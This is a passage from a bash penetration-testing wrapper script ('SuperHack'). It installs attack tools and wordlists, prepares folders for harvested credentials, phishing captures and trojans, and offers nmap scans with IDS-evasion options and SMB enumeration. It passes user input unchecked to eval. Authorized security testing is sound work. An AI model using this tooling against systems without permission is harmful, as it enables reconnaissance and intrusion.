#!/bin/bash

# SuperHack - Penetration Testing Automation Framework
# For authorized security testing only
# Compatible with Raspberry Pi (ARM architecture)
# Enhanced with Phishing Tools, OSINT, Blue Teaming, and Extended Capabilities

VERSION="3.0"                                         # Current framework version
CONFIG_DIR="/home/evanmarr/.superhack"                # Base configuration directory
LOG_DIR="$CONFIG_DIR/logs"                            # Directory for log files
WORDLISTS_DIR="$CONFIG_DIR/wordlists"                 # Password lists and dictionaries
RESULTS_DIR="$CONFIG_DIR/results"                     # Scan results storage
PHISHING_DIR="$CONFIG_DIR/phishing"                   # Phishing campaign files
CREDS_DIR="$CONFIG_DIR/credentials"                   # Harvested credentials storage
OSINT_DIR="$CONFIG_DIR/osint"                         # OSINT data storage
TROJANS_DIR="$RESULTS_DIR/trojans"                    # Payload/trojan storage

# Colors for output - ANSI escape codes for terminal formatting
RED='\033[0;31m'                                      # Red: errors, warnings, critical alerts
GREEN='\033[0;32m'                                    # Green: success, completion messages
YELLOW='\033[1;33m'                                   # Yellow: caution, in-progress, notices
BLUE='\033[0;34m'                                     # Blue: informational headers
CYAN='\033[0;36m'                                     # Cyan: banners, titles, highlights
MAGENTA='\033[0;35m'                                  # Magenta: special highlights
GREY='\033[0;90m'                                     # Grey: secondary info, disabled items
NC='\033[0m'                                          # No Color: reset to default

# =============================================================================
# PACKAGE DEFINITIONS
# =============================================================================

# Core system packages required for penetration testing
CORE_PACKAGES=(
    "nmap" "metasploit-framework" "netcat-traditional" "hydra" "gobuster"
    "dirb" "enum4linux-ng" "john" "hashcat" "sqlmap" "nikto" "masscan"
    "dnsutils" "whois" "curl" "wget" "git" "iw" "tcpdump" "proxychains4"
    "wireless-tools" "aircrack-ng" "python3" "python3-pip" "arp-scan"
    "netdiscover" "macchanger" "crackmapexec" "responder" "bloodhound.py"
    "wireshark" "tshark" "bettercap" "mitmproxy" "httrack" "sendemail"
    "openssl" "sshpass" "tmux" "screen" "vim" "nano" "lolcat" "clamav"
    "clamav-daemon" "rkhunter" "chkrootkit" "haveged" "libreoffice"
    "exiftool" "theharvester" "maltego" "spiderfoot" "recon-ng" "photon"
)

# Python packages for extended functionality
PYTHON_PACKAGES=(
    "impacket" "requests" "beautifulsoup4" "scapy" "pwntools" "python-nmap"
    "smbprotocol" "ldap3" "pyftpdlib" "pysmb" "paramiko" "cryptography"
    "pyOpenSSL" "flask" "django" "mechanize" "selenium" "pyautogui"
    "shodan" "censys" "requests-html" "social-analyzer" "holehe"
)

# Arrays to track missing packages during startup checks
MISSING_PACKAGES=()
MISSING_PYTHON=()

# =============================================================================
# INITIALIZATION & VALIDATION
# =============================================================================

# Strict sudo check - exit immediately if not root
# Many penetration testing tools require raw socket access and root privileges
if [[ $EUID -ne 0 ]]; then                            # Check Effective User ID is NOT 0
    echo "Must run with sudo. Quitting!"             # Error message for non-root users
    exit 1                                           # Exit with error code 1
fi

# =============================================================================
# UTILITY FUNCTIONS
# =============================================================================

# Create directory with error checking and fallback to sudo
# Arguments: $1 = directory path to create
create_dir() {
    local dir="$1"                                   # Local variable for directory path
    
    # Check if directory already exists
    if [[ ! -d "$dir" ]]; then
        # Attempt to create directory, suppress errors
        mkdir -p "$dir" 2>/dev/null || {
            # If mkdir fails, try with sudo
            echo -e "${RED}[!] Failed to create directory: $dir${NC}"
            sudo mkdir -p "$dir" 2>/dev/null || {
                # Critical failure - cannot create directory
                echo -e "${RED}[!] Critical: Cannot create directory $dir${NC}"
                return 1                             # Return error code
            }
        }
        chmod 755 "$dir" 2>/dev/null                   # Set permissions (rwxr-xr-x)
        echo -e "${GREEN}[+] Created directory: $dir${NC}"
    fi
    return 0                                         # Success
}

# Initialize all required directories for the framework
init_dirs() {
    echo -e "${BLUE}[*] Initializing directories...${NC}"
    
    # Create base directories with error checking
    create_dir "$CONFIG_DIR" || exit 1
    create_dir "$LOG_DIR" || exit 1
    create_dir "$WORDLISTS_DIR" || exit 1
    create_dir "$RESULTS_DIR" || exit 1
    create_dir "$RESULTS_DIR/nmap" || exit 1
    create_dir "$RESULTS_DIR/enumeration" || exit 1
    create_dir "$RESULTS_DIR/exploitation" || exit 1
    create_dir "$RESULTS_DIR/wifi" || exit 1
    create_dir "$RESULTS_DIR/bruteforce" || exit 1
    create_dir "$RESULTS_DIR/cracking" || exit 1
    create_dir "$RESULTS_DIR/trojans" || exit 1
    create_dir "$RESULTS_DIR/osint" || exit 1
    create_dir "$RESULTS_DIR/blueteam" || exit 1
    create_dir "$PHISHING_DIR" || exit 1              # Phishing campaign storage
    create_dir "$PHISHING_DIR/templates" || exit 1    # Phishing page templates
    create_dir "$PHISHING_DIR/captured" || exit 1     # Captured credentials/data
    create_dir "$CREDS_DIR" || exit 1                 # Credential database
    create_dir "$OSINT_DIR" || exit 1                 # OSINT data storage
    create_dir "$TROJANS_DIR" || exit 1               # Trojan/payload storage
    
    # Set ownership to original user (not root) for file access
    chown -R "$SUDO_USER:$SUDO_USER" "$CONFIG_DIR" 2>/dev/null || \
    chown -R "$(whoami):$(whoami)" "$CONFIG_DIR" 2>/dev/null || true
    
    echo -e "${GREEN}[+] Directories initialized${NC}"
}

# Prompt user to save results to file
# Arguments: $1 = data to save, $2 = default filename, $3 = subdirectory
save_results_prompt() {
    local data="$1"                                  # Data content to save
    local default_filename="$2"                      # Suggested filename
    local subdir="$3"                                # Subdirectory under RESULTS_DIR
    
    echo ""
    echo -n "Save results to file? (y/n): "
    read save_choice
    
    # Process if user wants to save
    if [[ "$save_choice" == "y" || "$save_choice" == "Y" ]]; then
        echo -n "Enter filename (default: $default_filename): "
        read custom_filename
        local filename="${custom_filename:-$default_filename}"  # Use default if empty
        
        # Ensure .txt extension for text files
        [[ "$filename" != *.txt ]] && filename="${filename}.txt"
        
        local output_path="$RESULTS_DIR/$subdir/$filename"
        
        # Write data to file
        if echo "$data" > "$output_path"; then
            echo -e "${GREEN}[+] Results saved to: $output_path${NC}"
        else
            echo -e "${RED}[!] Failed to save results${NC}"
        fi
    fi
}

# Execute command and optionally save output using tee
# Arguments: $1 = command, $2 = default filename, $3 = subdir, $4 = description
save_command_output() {
    local cmd="$1"                                   # Command to execute
    local default_filename="$2"                      # Default output filename
    local subdir="$3"                                # Results subdirectory
    local description="$4"                           # Description for prompt
    
    echo -n "Save $description to file? (y/n): "
    read save_choice
    
    if [[ "$save_choice" == "y" || "$save_choice" == "Y" ]]; then
        echo -n "Enter filename (default: $default_filename): "
        read custom_filename
        local filename="${custom_filename:-$default_filename}"
        
        [[ "$filename" != *.txt ]] && filename="${filename}.txt"
        
        local output_path="$RESULTS_DIR/$subdir/$filename"
        
        echo -e "${YELLOW}[*] Running and saving to $output_path...${NC}"
        eval "$cmd" | tee "$output_path"             # Execute and save simultaneously
        echo -e "${GREEN}[+] Results saved to: $output_path${NC}"
    else
        eval "$cmd"                                  # Just execute without saving
    fi
}

# Download file with retry logic for unreliable connections
# Arguments: $1 = URL, $2 = output path, $3 = max retries (optional)
download_file() {
    local url="$1"                                   # Source URL
    local output="$2"                                # Destination path
    local max_retries="${3:-3}"                      # Default 3 retries
    local retry=0
    
    # Create parent directory if needed
    local outdir=$(dirname "$output")
    create_dir "$outdir" || return 1
    
    # Retry loop for resilience
    while [[ $retry -lt $max_retries ]]; do
        echo -e "${YELLOW}[*] Downloading (attempt $((retry+1))/$max_retries): $(basename "$output")${NC}"
        
        # wget with timeout and resume capability
        if wget --timeout=30 --tries=2 --continue \
                --progress=bar:force \
                -O "$output.tmp" "$url" 2>&1 | tail -5; then
            
            # Verify download succeeded (file exists and not empty)
            if [[ -f "$output.tmp" && -s "$output.tmp" ]]; then
                mv "$output.tmp" "$output"           # Move from temp to final
                chmod 644 "$output"                  # Set read permissions
                echo -e "${GREEN}[+] Successfully downloaded: $(basename "$output")${NC}"
                return 0                             # Success
            fi
        fi
        
        retry=$((retry+1))
        [[ $retry -lt $max_retries ]] && sleep 2     # Wait before retry
    done
    
    # All retries failed
    rm -f "$output.tmp"
    echo -e "${RED}[!] Failed to download after $max_retries attempts${NC}"
    return 1                                         # Failure
}

# Clone or update git repository
# Arguments: $1 = repository URL, $2 = destination path
clone_repo() {
    local url="$1"                                   # Git repository URL
    local dest="$2"                                  # Local destination
    
    local destdir=$(dirname "$dest")
    create_dir "$destdir" || return 1
    
    # Update existing repository
    if [[ -d "$dest" ]]; then
        echo -e "${YELLOW}[!] Directory exists, updating: $(basename "$dest")${NC}"
        cd "$dest" && git pull --depth 1 2>/dev/null || {
            echo -e "${YELLOW}[!] Update failed, using existing files${NC}"
            return 0
        }
        echo -e "${GREEN}[+] Updated repository${NC}"
        return 0
    fi
    
    # Clone new repository
    echo -e "${YELLOW}[*] Cloning repository...${NC}"
    if git clone --depth 1 "$url" "$dest" 2>&1 | tail -10; then
        if [[ -d "$dest" ]]; then
            echo -e "${GREEN}[+] Successfully cloned: $(basename "$dest")${NC}"
            return 0
        fi
    fi
    
    echo -e "${RED}[!] Failed to clone repository${NC}"
    return 1
}

# =============================================================================
# DISPLAY FUNCTIONS
# =============================================================================

# Display ASCII art banner piped through lolcat
show_banner() {
    clear
    # Check if lolcat is available, otherwise use standard colors
    if command -v lolcat &>/dev/null; then
        cat << "EOF" | lolcat
    ███████╗██╗   ██╗██████╗ ███████╗██████╗ ██╗  ██╗ █████╗  ██████╗██╗  ██╗
    ██╔════╝██║   ██║██╔══██╗██╔════╝██╔══██╗██║  ██║██╔══██╗██╔════╝██║ ██╔╝
    ███████╗██║   ██║██████╔╝█████╗  ██████╔╝███████║███████║██║     █████╔╝
    ╚════██║██║   ██║██╔═══╝ ██╔══╝  ██╔══██╗██╔══██║██╔══██║██║     ██╔═██╗
    ███████║╚██████╔╝██║     ███████╗██║  ██║██║  ██║██║  ██║╚██████╗██║  ██╗
    ╚══════╝ ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
EOF
    else
        echo -e "${CYAN}"
        cat << "EOF"
    ███████╗██╗   ██╗██████╗ ███████╗██████╗ ██╗  ██╗ █████╗  ██████╗██╗  ██╗
    ██╔════╝██║   ██║██╔══██╗██╔════╝██╔══██╗██║  ██║██╔══██╗██╔════╝██║ ██╔╝
    ███████╗██║   ██║██████╔╝█████╗  ██████╔╝███████║███████║██║     █████╔╝
    ╚════██║██║   ██║██╔═══╝ ██╔══╝  ██╔══██╗██╔══██║██╔══██║██║     ██╔═██╗
    ███████║╚██████╔╝██║     ███████╗██║  ██║██║  ██║██║  ██║╚██████╗██║  ██╗
    ╚══════╝ ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
EOF
        echo -e "${NC}"
    fi
    
    if command -v lolcat &>/dev/null; then
        echo "     The ultimate hacking multitool" | lolcat
        echo "" | lolcat
        echo "                    [ Raspberry Pi Edition v$VERSION ]" | lolcat
        echo "                    [ Authorized Use Only ]" | lolcat
        echo "                    [ Copywrite 2026 By Evan Marr ]" | lolcat
    else
        echo -e "${CYAN}     The ultimate hacking multitool${NC}"
        echo -e ""
        echo -e "${MAGENTA}                    [ Raspberry Pi Edition v$VERSION ]${NC}"
        echo -e "${RED}                    [ Authorized Use Only ]${NC}"
        echo -e "${BLUE}                    [ Copywrite 2026 By Evan Marr ]${NC}"
    fi
    echo ""
}

# =============================================================================
# PACKAGE MANAGEMENT
# =============================================================================

# Check if system package is installed
is_installed() {
    dpkg -l "$1" 2>/dev/null | grep -q "^ii  $1 " || command -v "$1" &>/dev/null
}

# Check if Python package is installed
is_python_installed() {
    local pkg="$1"
    local import_name="${pkg//-/_}"
    [[ "$pkg" == "beautifulsoup4" ]] && import_name="bs4"
    [[ "$pkg" == "python-nmap" ]] && import_name="nmap"
    python3 -c "import $import_name" 2>/dev/null
}

# Scan for missing packages and populate arrays
check_missing_packages() {
    MISSING_PACKAGES=()
    echo -e "${BLUE}[*] Checking system packages...${NC}"
    
    for pkg in "${CORE_PACKAGES[@]}"; do
        if ! dpkg -l 2>/dev/null | grep -q "^ii  $pkg " && ! command -v "$pkg" &>/dev/null; then
            MISSING_PACKAGES+=("$pkg")
            echo -e "${GREY}    - Missing: $pkg${NC}"
        fi
    done
    
    MISSING_PYTHON=()
    echo -e "${BLUE}[*] Checking Python packages...${NC}"
    
    for pkg in "${PYTHON_PACKAGES[@]}"; do
        if ! is_python_installed "$pkg"; then
            MISSING_PYTHON+=("$pkg")
            echo -e "${GREY}    - Missing: $pkg${NC}"
        fi
    done
}

# Smart package manager - runs at startup
smart_package_manager() {
    check_missing_packages
    
    local total_missing=${#MISSING_PACKAGES[@]}
    local total_missing_py=${#MISSING_PYTHON[@]}
    local total=$((total_missing + total_missing_py))
    
    # All packages installed
    if [[ $total -eq 0 ]]; then
        echo -e "${GREEN}[+] All dependencies are installed and up to date!${NC}"
        sleep 1
        return 0
    fi
    
    # Display missing packages
    echo -e "${YELLOW}[!] Found $total missing package(s):${NC}"
    echo ""
    
    if [[ $total_missing -gt 0 ]]; then
        echo -e "${CYAN}System packages missing ($total_missing):${NC}"
        printf '  - %s\n' "${MISSING_PACKAGES[@]}"
        echo ""
    fi
    
    if [[ $total_missing_py -gt 0 ]]; then
        echo -e "${CYAN}Python packages missing ($total_missing_py):${NC}"
        printf '  - %s\n' "${MISSING_PYTHON[@]}"
        echo ""
    fi
    
    # User choice for installation
    echo "What would you like to do?"
    echo "1) Install ALL missing packages"
    echo "2) Select which packages to install"
    echo "3) Skip for now (not recommended)"
    echo "0) Back to main menu"
    echo -n "Choice: "
    read choice
    
    case $choice in
        1) install_all_packages ;;
        2) selective_package_install ;;
        3) 
            echo -e "${YELLOW}[!] Some features may not work without dependencies${NC}"
            sleep 2
            ;;
        0) return ;;
        *) 
            echo -e "${RED}Invalid choice, skipping...${NC}"
            sleep 1
            ;;
    esac
}

# Install package with retry logic
install_package() {
    local pkg="$1"
    local max_retries=2
    local retry=0
    
    # Update package lists if not done recently
    if [[ ! -f /var/cache/apt/pkgcache.bin ]] || [[ $(find /var/cache/apt/pkgcache.bin -mmin +60 2>/dev/null) ]]; then
        echo -e "${YELLOW}[*] Updating package lists...${NC}"
        apt-get update -qq || true
    fi
    
    while [[ $retry -lt $max_retries ]]; do
        echo -e "${YELLOW}[*] Installing $pkg (attempt $((retry+1))/$max_retries)...${NC}"
        
        # Fix for packages that might have different names
        local install_pkg="$pkg"
        [[ "$pkg" == "python3-pip" ]] && apt-get install -y python3-pip python3-setuptools python3-wheel 2>&1 | tail -20 && return 0
        
        if apt-get install -y "$install_pkg" 2>&1 | tail -20; then
            if dpkg -l | grep -q "^ii  $install_pkg " || command -v "$pkg" &>/dev/null; then
                echo -e "${GREEN}[+] $pkg installed successfully${NC}"
                return 0
            fi
        fi
        
        retry=$((retry+1))
        [[ $retry -lt $max_retries ]] && sleep 2
    done
    
    echo -e "${RED}[!] Failed to install $pkg after $max_retries attempts${NC}"
    return 1
}

# Install Python package with retry
install_python_package() {
    local pkg="$1"
    local max_retries=2
    local retry=0
    
    # Ensure pip is installed first
    if ! command -v pip3 &>/dev/null; then
        apt-get install -y python3-pip 2>/dev/null || apt-get install -y python3 python3-pip 2>/dev/null
    fi
    
    while [[ $retry -lt $max_retries ]]; do
        echo -e "${YELLOW}[*] Installing Python package $pkg (attempt $((retry+1))/$max_retries)...${NC}"
        
        if pip3 install --break-system-packages "$pkg" 2>&1 | tail -20 || pip3 install "$pkg" 2>&1 | tail -20; then
            if is_python_installed "$pkg"; then
                echo -e "${GREEN}[+] $pkg installed successfully${NC}"
                return 0
            fi
        fi
        
        retry=$((retry+1))
        [[ $retry -lt $max_retries ]] && sleep 2
    done
    
    echo -e "${RED}[!] Failed to install $pkg after $max_retries attempts${NC}"
    return 1
}

# Install all missing packages
install_all_packages() {
    echo -e "${BLUE}[*] Installing all missing packages...${NC}"
    
    echo -e "${YELLOW}[*] Updating package lists...${NC}"
    apt-get update -qq || {
        echo -e "${RED}[!] Failed to update package lists${NC}"
        return 1
    }
    
    # Install system packages
    if [[ ${#MISSING_PACKAGES[@]} -gt 0 ]]; then
        echo -e "${YELLOW}[*] Installing ${#MISSING_PACKAGES[@]} system packages...${NC}"
        for pkg in "${MISSING_PACKAGES[@]}"; do
            install_package "$pkg" || true
        done
    fi
    
    # Install Python packages
    if [[ ${#MISSING_PYTHON[@]} -gt 0 ]]; then
        echo -e "${YELLOW}[*] Installing ${#MISSING_PYTHON[@]} Python packages...${NC}"
        pip3 install --upgrade pip --break-system-packages 2>/dev/null || pip3 install --upgrade pip 2>/dev/null || true
        
        for pkg in "${MISSING_PYTHON[@]}"; do
            install_python_package "$pkg" || true
        done
    fi
    
    download_wordlists
    
    # Initialize Metasploit database
    if command -v msfdb &> /dev/null; then
        echo -e "${BLUE}[*] Initializing Metasploit database...${NC}"
        msfdb init 2>/dev/null || msfdb reinit 2>/dev/null || true
    fi
    
    # Initialize ClamAV database
    if command -v freshclam &> /dev/null; then
        echo -e "${BLUE}[*] Updating ClamAV database...${NC}"
        freshclam 2>/dev/null || true
    fi
    
    echo -e "${GREEN}[+] Package installation complete!${NC}"
    echo -n "Press Enter to continue..."
    read
}

# Selective package installation
selective_package_install() {
    local all_packages=("${MISSING_PACKAGES[@]}" "${MISSING_PYTHON[@]}")
    local i=1
    local selections
    
    echo -e "${CYAN}Select packages to install (enter numbers separated by spaces):${NC}"
    echo ""
    
    # Display numbered list
    for pkg in "${MISSING_PACKAGES[@]}"; do
        echo "  $i) [SYSTEM] $pkg"
        ((i++))
    done
    
    for pkg in "${MISSING_PYTHON[@]}"; do
        echo "  $i) [PYTHON] $pkg"
        ((i++))
    done
    
    echo ""
    echo "0) Back to main menu"
    echo ""
    echo -n "Enter package numbers (e.g., 1 3 5): "
    read selections
    
    [[ "$selections" == "0" ]] && return
    
    apt-get update -qq || true
    
    # Process selections
    for num in $selections; do
        if [[ $num -le ${#MISSING_PACKAGES[@]} ]]; then
            local pkg="${MISSING_PACKAGES[$((num-1))]}"
            install_package "$pkg"
        else
            local py_idx=$((num - ${#MISSING_PACKAGES[@]} - 1))
            [[ $py_idx -ge 0 ]] && local pkg="${MISSING_PYTHON[$py_idx]}" && install_python_package "$pkg"
        fi
    done
    
    echo ""
    echo -n "Download wordlists too? (y/n): "
    read dl_wordlists
    [[ "$dl_wordlists" == "y" ]] && download_wordlists
    
    echo -e "${GREEN}[+] Selected packages installed!${NC}"
    echo -n "Press Enter to continue..."
    read
}

# Download essential wordlists
download_wordlists() {
    echo -e "${BLUE}[*] Checking wordlists...${NC}"
    
    # Download rockyou.txt password list
    if [[ ! -f "$WORDLISTS_DIR/rockyou.txt" ]]; then
        echo -e "${YELLOW}[!] Downloading rockyou.txt...${NC}"
        
        local urls=(
            "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt"
            "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz"
        )
        
        local downloaded=false
        for url in "${urls[@]}"; do
            if [[ "$url" == *.tar.gz ]]; then
                if download_file "$url" "$WORDLISTS_DIR/rockyou.txt.tar.gz"; then
                    echo -e "${YELLOW}[*] Extracting archive...${NC}"
                    tar -xzf "$WORDLISTS_DIR/rockyou.txt.tar.gz" -C "$WORDLISTS_DIR" 2>/dev/null && \
                    rm -f "$WORDLISTS_DIR/rockyou.txt.tar.gz"
                    [[ -f "$WORDLISTS_DIR/rockyou.txt" ]] && downloaded=true
                fi
            else
                if download_file "$url" "$WORDLISTS_DIR/rockyou.txt"; then
                    downloaded=true
                    break
                fi
            fi
        done
        
        # Verify download or create placeholder
        if $downloaded && [[ -f "$WORDLISTS_DIR/rockyou.txt" && -s "$WORDLISTS_DIR/rockyou.txt" ]]; then
            local size=$(du -h "$WORDLISTS_DIR/rockyou.txt" | cut -f1)
            echo -e "${GREEN}[+] rockyou.txt downloaded ($size)${NC}"
        else
            echo -e "${RED}[!] Failed to download rockyou.txt${NC}"
            echo "password" > "$WORDLISTS_DIR/rockyou.txt"
            echo -e "${YELLOW}[!] Created minimal placeholder wordlist${NC}"
        fi
    else
        echo -e "${GREEN}[+] rockyou.txt already exists${NC}"
    fi
    
    # Download SecLists collection
    if [[ ! -d "$WORDLISTS_DIR/seclists" ]]; then
        echo -e "${YELLOW}[!] Downloading SecLists...${NC}"
        if clone_repo "https://github.com/danielmiessler/SecLists.git" "$WORDLISTS_DIR/seclists"; then
            if [[ -d "$WORDLISTS_DIR/seclists/Discovery" ]]; then
                echo -e "${GREEN}[+] SecLists downloaded successfully${NC}"
            else
                echo -e "${RED}[!] SecLists download incomplete${NC}"
            fi
        fi
    else
        echo -e "${GREEN}[+] SecLists already exists${NC}"
    fi
    
    chmod -R 755 "$WORDLISTS_DIR" 2>/dev/null || true
}

# Legacy compatibility wrapper
check_install() {
    local pkg=$1
    local cmd=${2:-$pkg}
    
    if ! command -v "$cmd" &> /dev/null; then
        echo -e "${YELLOW}[!] $pkg not found. Installing...${NC}"
        install_package "$pkg" || {
            echo -e "${RED}[!] Failed to install $pkg${NC}"
            return 1
        }
    fi
}

# =============================================================================
# NETWORK SCANNING MODULES
# =============================================================================

# Advanced customizable Nmap scanner with multiple options
advanced_nmap_scan() {
    check_install nmap
    echo -e "${BLUE}[*] Advanced Nmap Scanner${NC}"
    echo ""
    
    echo -n "Enter target(s) (IP, hostname, range, or file with -iL): "
    read target
    
    echo ""
    echo -e "${CYAN}=== SCAN TYPE ===${NC}"
    echo "1) SYN Scan (-sS) - Stealth, requires root"
    echo "2) Connect Scan (-sT) - TCP connect"
    echo "3) UDP Scan (-sU) - UDP ports"
    echo "4) ACK Scan (-sA) - Firewall rule mapping"
    echo "5) Window Scan (-sW) - Similar to ACK"
    echo "6) FIN/NULL/Xmas Scan (-sF/sN/sX) - Stealthy"
    echo "7) Comprehensive (Multiple types)"
    echo "0) Back to main menu"
    echo -n "Select scan type: "
    read scan_type
    
    [[ "$scan_type" == "0" ]] && return
    
    echo ""
    echo -e "${CYAN}=== PORT SELECTION ===${NC}"
    echo "1) Top 100 common ports (--top-ports 100)"
    echo "2) Top 1000 common ports (--top-ports 1000)"
    echo "3) All 65535 ports (-p-)"
    echo "4) Specific ports (e.g., 80,443,8080)"
    echo "5) Default Nmap ports"
    echo "0) Back to main menu"
    echo -n "Select port option: "
    read port_option
    
    [[ "$port_option" == "0" ]] && return
    
    # Configure port scanning options
    case $port_option in
        1) port_flag="--top-ports 100" ;;
        2) port_flag="--top-ports 1000" ;;
        3) port_flag="-p-" ;;
        4) 
            echo -n "Enter ports (comma-separated or range like 1-1000): "
            read custom_ports
            port_flag="-p $custom_ports"
            ;;
        5) port_flag="" ;;
    esac
    
    echo ""
    echo -e "${CYAN}=== ADDITIONAL OPTIONS ===${NC}"
    
    echo -n "Enable service/version detection (-sV)? (y/n): "
    read sv_detect
    [[ "$sv_detect" == "y" ]] && sv_flag="-sV" || sv_flag=""
    
    echo -n "Enable OS detection (-O)? (y/n): "
    read os_detect
    [[ "$os_detect" == "y" ]] && os_flag="-O" || os_flag=""
    
    echo -n "Enable aggressive scan (includes -sV -O --traceroute)? (y/n): "
    read aggressive
    if [[ "$aggressive" == "y" ]]; then
        agg_flag="-A"
        sv_flag=""
        os_flag=""
    else
        agg_flag=""
    fi
    
    echo -n "Enable script scan? (y/n): "
    read script_scan
    if [[ "$script_scan" == "y" ]]; then
        echo "  Script categories:"
        echo "  1) Default scripts (-sC)"
        echo "  2) Safe scripts (--script safe)"
        echo "  3) Vulnerability scripts (--script vuln)"
        echo "  4) All scripts (--script all)"
        echo "  5) Custom script (--script <name>)"
        echo "  0) Back to main menu"
        echo -n "  Select: "
        read script_choice
        
        [[ "$script_choice" == "0" ]] && return
        
        case $script_choice in
            1) script_flag="-sC" ;;
            2) script_flag="--script safe" ;;
            3) script_flag="--script vuln" ;;
            4) script_flag="--script all" ;;
            5) 
                echo -n "Enter script name: "
                read custom_script
                script_flag="--script $custom_script"
                ;;
        esac
    else
        script_flag=""
    fi
    
    echo ""
    echo -e "${CYAN}=== TIMING & PERFORMANCE ===${NC}"
    echo "1) Paranoid (T0) - IDS evasion"
    echo "2) Sneaky (T1)"
    echo "3) Polite (T2)"
    echo "4) Normal (T3)"
    echo "5) Aggressive (T4)"
    echo "6) Insane (T5)"
    echo "0) Back to main menu"
    echo -n "Select timing template: "
    read timing
    
    [[ "$timing" == "0" ]] && return
    
    case $timing in
        1) time_flag="-T0" ;;
        2) time_flag="-T1" ;;
        3) time_flag="-T2" ;;
        4) time_flag="-T3" ;;
        5) time_flag="-T4" ;;
        6) time_flag="-T5" ;;
        *) time_flag="-T4" ;;
    esac
    
    echo -n "Enable fragmentation (-f)? (y/n): "
    read fragment
    [[ "$fragment" == "y" ]] && frag_flag="-f" || frag_flag=""
    
    echo -n "Enable verbose output (-v)? (y/n): "
    read verbose
    [[ "$verbose" == "y" ]] && verb_flag="-v" || verb_flag=""
    
    echo ""
    echo -n "Auto-save results? (y/n): "
    read auto_save
    
    timestamp=$(date +%Y%m%d_%H%M%S)
    
    if [[ "$auto_save" == "y" ]]; then
        output_base="$RESULTS_DIR/nmap/nmap_scan_$timestamp"
        output_flag="-oA $output_base"
        echo -e "${GREEN}[+] Will save results to: $output_base.{nmap,xml,gnmap}${NC}"
    else
        output_flag=""
    fi
    
    # Set scan type flag
    case $scan_type in
        1) scan_flag="-sS" ;;
        2) scan_flag="-sT" ;;
        3) scan_flag="-sU" ;;
        4) scan_flag="-sA" ;;
        5) scan_flag="-sW" ;;
        6) 
            echo "Select specific stealth scan:"
            echo "1) FIN (-sF)"
            echo "2) NULL (-sN)"
            echo "3) Xmas (-sX)"
            echo "0) Back to main menu"
            read stealth_choice
            
            [[ "$stealth_choice" == "0" ]] && return
            
            case $stealth_choice in
                1) scan_flag="-sF" ;;
                2) scan_flag="-sN" ;;
                3) scan_flag="-sX" ;;
            esac
            ;;
        7)
            echo -e "${YELLOW}[*] Running comprehensive scan...${NC}"
            ;;
    esac
    
    # Build and execute nmap command
    local nmap_cmd="nmap $scan_flag $port_flag $sv_flag $os_flag $agg_flag $script_flag $time_flag $frag_flag $verb_flag $output_flag $target"
    
    echo ""
    echo -e "${CYAN}=== SCAN CONFIGURATION ===${NC}"
    echo -e "${GREEN}Command: $nmap_cmd${NC}"
    echo ""
    echo -n "Press Enter to start scan or Ctrl+C to cancel..."
    read
    
    echo -e "${YELLOW}[*] Starting scan...${NC}"
    echo -e "${CYAN}========================================${NC}"
    
    if [[ -n "$output_flag" ]]; then
        eval "$nmap_cmd"
        echo -e "${CYAN}========================================${NC}"
        echo -e "${GREEN}[+] Results saved to: $output_base.{nmap,xml,gnmap}${NC}"
    else
        local results=$(eval "$nmap_cmd" 2>&1)
        echo "$results"
        echo -e "${CYAN}========================================${NC}"
        
        # Ask to save after scan
        save_results_prompt "$results" "nmap_scan_$timestamp.txt" "nmap"
    fi
    
    echo ""
    echo -n "Press Enter to continue..."
    read
}

# Network discovery via ping sweeps
network_discovery() {
    check_install nmap
    echo -e "${BLUE}[*] Network Discovery Module${NC}"
    echo -n "Enter target subnet (e.g., 192.168.1.0/24): "
    read subnet
    
    [[ -z "$subnet" ]] && return
    
    timestamp=$(date +%Y%m%d_%H%M%S)
    
    echo -e "${YELLOW}[*] Scanning $subnet for live hosts...${NC}"
    
    echo -n "Auto-save results? (y/n): "
    read auto_save
    
    if [[ "$auto_save" == "y" ]]; then
        local output_file="$RESULTS_DIR/nmap/discovery_$timestamp.txt"
        nmap -sn "$subnet" -oN "$output_file"
        echo -e "${GREEN}[+] Results saved to: $output_file${NC}"
        cat "$output_file"
    else
        local results=$(nmap -sn "$subnet" 2>&1)
        echo "$results"
        
        save_results_prompt "$results" "discovery_$timestamp.txt" "nmap"
    fi
    
    echo -n "Press Enter to continue..."
    read
}

# Legacy port scanner (redirects to advanced)
port_scanner() {
    echo -e "${YELLOW}[*] Basic port scanner deprecated. Use Advanced Nmap Scanner.${NC}"
    sleep 1
    advanced_nmap_scan
}

# =============================================================================
# ENUMERATION MODULES
# =============================================================================

# SMB enumeration for Windows file shares
smb_enum() {
    check_install enum4linux-ng enum4linux-ng
    echo -e "${BLUE}[*] SMB Enumeration Module${NC}"
    echo -n "Enter target IP: "
    read target
    
    [[ -z "$target" ]] && return
    
    timestamp=$(date +%Y%m%d_%H%M%S)
    
    echo -n "Auto-save results? (y/n): "
    read auto_save
    
    if [[ "$auto_save" == "y" ]]; then
        local output_file="$RESULTS_DIR/enumeration/smb_${target}_$timestamp.txt"
        echo -e "${YELLOW}[*] Enumerating SMB shares and users...${NC}"
        enum4linux-ng -A "$target" | tee "$output_file"
        echo -e "${GREEN}[+] Results saved to: $output_file${NC}"
    else
        echo -e "${YELLOW}[*] Enumerating SMB shares and users...${NC}"
        local results=$(enum4linux-ng -A "$target" 2>&1)
        echo "$results"
        
        save_results_prompt "$results" "smb_${target}_$timestamp.txt" "enumeration"
    fi
    
    echo -n "Press Enter to continue..."
    read
}

# LDAP/Active Directory enumeration
ldap_enum() {
    echo -e "${BLUE}[*] LDAP/Active Directory Enumeration${NC}"
    echo -n "Enter target DC IP: "
    read dc_ip
    
    [[ -z "$dc_ip" ]] && return
    
    echo -n "Enter domain name (e.g., corp.local): "
    read domain
    
    timestamp=$(date +%Y%m%d_%H%M%S)
    
    echo ""
    echo -e "${CYAN}=== LDAP ENUMERATION OPTIONS ===${NC}"
    echo "1) Anonymous LDAP bind"
    echo "2) Authenticated LDAP query"
    echo "3) LDAP user enumeration"
    echo "4) BloodHound data collection"
    echo "0) Back to main menu"
    echo -n "Select option: "
    read ldap_choice
    
    [[ "$ldap_choice" == "0" ]] && return
    
